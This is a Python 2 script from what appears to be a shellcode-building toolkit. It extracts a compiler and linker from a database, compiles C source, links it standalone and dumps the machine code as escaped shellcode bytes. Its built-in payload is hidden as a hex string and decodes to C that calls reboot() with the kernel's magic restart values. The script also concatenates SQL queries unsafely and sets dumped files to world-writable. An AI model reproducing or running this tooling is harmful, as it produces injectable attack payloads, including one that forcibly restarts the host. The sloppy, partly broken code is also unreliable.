import sys
import sqlite3 as sqlite
import subprocess
import tarfile
import optparse
from CreateToolkit import database
import re
import os.path
import sys
os_path = os.path.join(os.path.dirname(__file__), "..")
print os_path
os_abs_path = os.path.abspath(os_path)
print os_abs_path
sys.path.append(os_abs_path)
sys.path.append('.')
print "Done with path shit"
hex = '''696E74205F7374617274282920207B202020202020202020205F5F61736D5F5F282020202020202020202022707573682024307837323635373337355C6E5C74222020202020202020202022707573682024307836633734373332655C6E5C74222020202020202020202022707573682024307836343631373437345C6E5C7422202020202020202020202270757368202573705C6E5C7422202020202020202020202263616C6C20736322293B2020202020202020202072657475726E20303B20207D20202020696E74207363286368617220617267735B3330305D2920207B20202020207265626F6F7428307866656531646561642C38353037323237382C30783031323334353637293B2020202020202072657475726E20303B20207D'''


#accept text input and drop as c file...no newlines
def DropCFile(text):
	print "dropping shellit"
	cf = open('shellit.c','w')
	cf.write(text)
	cf.close()
	print "dropped shellit"
#Drop the requested object file from the db, return 
def DropFilesTool(table):
	drop_count = 0
	cur = db.con.cursor()
	full_conn_str="select data,toolname from "+table
	toolnames =[]
	for row in cur.execute(full_conn_str):
		with open(row[1], "wb") as output_file:
			output_file.write(row[0])
			subprocess.call(['chmod','777',row[1]])
			toolnames.append(row[1])
	cur.close()
	tar = tarfile.open('sysroot.tar.gz')
	tar.extractall()
	tar.close()
	tar = tarfile.open('sysroot')
	tar.extractall()
	tar.close()
	return toolnames

def GetSyscallsFromCfile(text,db,table):
	cur = db.con.cursor()
	syscalls = []
	known_calls=[]
	for row in cur.execute("select syscall from "+table):
		syscalls.append(row[0])

	pattern=re.compile("[^A-Za-z0-9\\s\(_]+")
	words =str(pattern.sub('',text))
	words = words.split()
	
	#match the syscalls in the file to the table
	for potential_syscall in words:
		matchobj=re.search(".*\(|\(.*\(",potential_syscall,re.S)
		try:
			almost_call = matchobj.group()
			almost_call=almost_call.strip('(')
			if almost_call in syscalls:
				
				known_calls.append(almost_call)
		except:
			continue
		
	cur.close()
	dropped_calls = DropFilesObject(known_calls,table)
	return dropped_calls
#drop object file from db and return their names in a tuple
def DropFilesObject(syscalls,table):
	cur = db.con.cursor()
	known_calls =[]
	constr = ""

	for i in range(0,len(syscalls)):
		
		if i < (len(syscalls)-1):
			constr	= constr + "syscall='"+syscalls[i]+"' or "
		else:
			constr	= constr + "syscall='"+syscalls[i]+"'"
		
		i +=1

	full_conn_str="select data,syscall from "+table	+" where "+constr

	for row in cur.execute(full_conn_str):
		with open(row[1]+".o", "wb") as output_file:
			output_file.write(row[0])
			known_calls.append(row[1])
	cur.close()
	return known_calls
	
def Compile(gcc,infile,outfile):
	args = [gcc,'-B./','-Iusr/include','-c',infile,'-o',outfile]
	proc = subprocess.Popen(args,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
	for line in iter(proc.stderr.readline,''):
		print line

#Generate astub routine for any unresolved calls that weren't found 
#	in the database
def GenStubRoutine(undef_func,additional_info):
	hexer_colon = ':'.encode('hex')
	if undef_func.encode('hex').endswith(hexer_colon):
		return ""
	else:
		print "undef_func is %s"%undef_func
		print "additional_info is %s"%additional_info
		#detect gcc tls crap see: http://publib.boulder.ibm.com/infocenter/comphelp/v101v121/index.jsp?topic=/com.ibm.xlcpp101.aix.doc/language_ref/thread.html
		if 'TLS' in additional_info:
			return "__thread int "+undef_func+";"
		else:
			return "extern __thread unsigned int errno = 0;\nextern int "+undef_func+"(){ \n\treturn 0;\n}\n"
def Assemble(gcc,syscalls,table,ld,additional=[],secondrun=False):
	total_line = ""
	args = [ld,'-nostart','-nodefaultlib','-nostdlib']
	stubby = ""
	args.append('-o')
	args.append('file.bin')
	args.append('file.o')
	for unres in additional:
		args.append(unres)
	#args.append(home_dir+'/dl_sysinfo.o')
	for i in range(0,len(syscalls)):
		line = syscalls[i].strip()
		args.append(line+".o")
		i +=1
	unres_objects=[]
	#args.append('1>&2')
	print args
	proc = subprocess.Popen(args,stderr=subprocess.PIPE,stdout=subprocess.PIPE)	
	for line in iter(proc.stderr.readline,''):
		line=line.strip()
		#print line
		total_line=total_line+line
		print 'total_line is %s'%total_line
		#hunting for the unresolved calls here
		if 'TLS' in total_line:
			pattern=re.compile("ld:[\s\w]+",flags=re.S)
			words = pattern.findall(line)
			for unres_call in words:
				unres_call = unres_call.strip('ld: ')
				print "words were %s" %unres_call
				stubby = ""
				dropped_files = DropFilesObject(unres_call,table)
				if len(dropped_files) >0:
					for dropped_file in dropped_files:
						unres_objects.append(dropped_file)
				else:
					stubby = stubby+GenStubRoutine(unres_call,total_line)
					file_c = open('additional.c','wb')
					file_c.write(stubby)
					file_c.close()
	#if secondrun == False:	
					Compile(gcc,'additional.c','additional.o')
					unres_objects.append('additional.o')
		if "undefined" in total_line:
			pattern=re.compile("[\S\']+",flags=re.S)
			words = pattern.findall(line)
			for unres_call in words:
				unres_call = unres_call.encode('hex')
				if(unres_call.startswith('60')):
					unres_call = unres_call.strip('60')
					unres_call = unres_call.strip('27')
					unres_call = unres_call.decode('hex')
					#search again for the syscalls here
					stubby = ""
					dropped_files = DropFilesObject(unres_call,table)
					if len(dropped_files) >0:
						for dropped_file in dropped_files:
							unres_objects.append(dropped_file)
					else:
						stubby = stubby+GenStubRoutine(unres_call,total_line)
						file_c = open('additional.c','wb')
						file_c.write(stubby)
						file_c.close()
		#if secondrun == False:	
						Compile(gcc,'additional.c','additional.o')
						unres_objects.append('additional.o')
	if len(unres_objects)>0:
		Assemble(gcc,syscalls,table,ld,unres_objects,True)		
def GetShellcode(table):
	args=['./objdump','-d','--section=.text','file.bin']
	raw_dump = [[]]
	proc = subprocess.Popen(args,stderr=subprocess.PIPE,stdout=subprocess.PIPE)	
	for line in iter(proc.stdout.readline,''):
		line=line.strip()
		words = line.split('\t')
		if len(words)==3:
			raw_dump.append(["\"\\x"+words[1].strip().replace(' ','\\x')+"\"","//"+words[2]])

	#drop shellack.sh
	#exec shellack.sh
	#print shellcode
	for item in raw_dump:
		if len(item) ==2:
			print "{0:60} {1}".format(item[0],item[1])
if __name__ == '__main__':
	filecontent	=""
	parser 		= optparse.OptionParser()
	parser.add_option('-c', '--c-filecontent', 
		dest='filecontent',
		help='\t\tc file to upload')
	parser.add_option('-a', '--arch', 
		dest='arch',
		help='\t\tdesired cpu architecture')
	parser.add_option('-o', '--os', 
		dest='OS',
		help='\t\tdesired operating system')
	parser.add_option('-v', '--version', 
		dest='version',
		help='\t\tdesired os version')
	(opts, args)= parser.parse_args()
	if not opts.OS:
		parser.error('OS title not given, i.e. Ubunutu, or FreeBSD')
	print "Get ready to assemble..."
	filecontent=hex.decode('hex')
	db = database(str(opts.OS).lower())
	gcc="./cc"
	ld="./ld"
	#dump tools
	toolnames = DropFilesTool(opts.OS+'_tools')
	for toolname in toolnames:
		if toolname.endswith('cc'):
			gcc="./"+toolname
		elif toolname.endswith('ld'):
			ld="./"+toolname
	#get required objects
	DropCFile(filecontent)
	#dump objects
	syscalls = GetSyscallsFromCfile(filecontent,db,opts.OS)
	#compile file
	print ld
	print gcc
	print syscalls
	Compile(gcc,'shellit.c','file.o')
	#link together
	Assemble(gcc,syscalls,opts.OS,ld)
	#shellack
	GetShellcode(opts.OS)
	print "Dynotherms connected"
	
	print "Form arms and body"
	
	print "and I'll form the head"
	
	print "GoLion"
	db.close()
